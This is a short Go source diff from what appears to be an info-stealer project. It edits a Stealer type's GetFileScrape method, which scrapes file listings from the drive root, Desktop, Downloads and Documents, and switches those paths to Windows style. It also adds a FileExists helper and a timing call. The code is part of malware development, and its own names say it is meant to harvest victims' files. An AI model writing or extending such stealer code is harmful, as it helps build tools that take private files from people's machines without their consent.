@@ -6,6 +6,7 @@
 package main
 
 import (
+	"time"
 	"encoding/json"
 	"io"
 	"os"
@@ -114,13 +115,24 @@ func CopyFileToDirectory(pathSourceFile string, pathDestFile string) bool {
 	return err == nil
 }
 
+func FileExists(filePath string) bool {
+	// Check if a filepath exists on the machine
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		return false
+	}
+
+	return true
+}
+
 func (stealer *Stealer) GetFileScrape() {
+	defer TimeTrack(time.Now())
+
 	// Scrape common paths using GetFiles
 	stealer.Memory.Files = Files{
-		Drive:     GetFiles(`/`),
-		Desktop:   GetFiles(`/Desktop`),
-		Downloads: GetFiles(`/Downloads`),
-		Documents: GetFiles(`/Documents`),
+		Drive:     GetFiles(`\\`),
+		Desktop:   GetFiles(`\\Desktop`),
+		Downloads: GetFiles(`\\Downloads`),
+		Documents: GetFiles(`\\Documents`),
 	}
 }
 
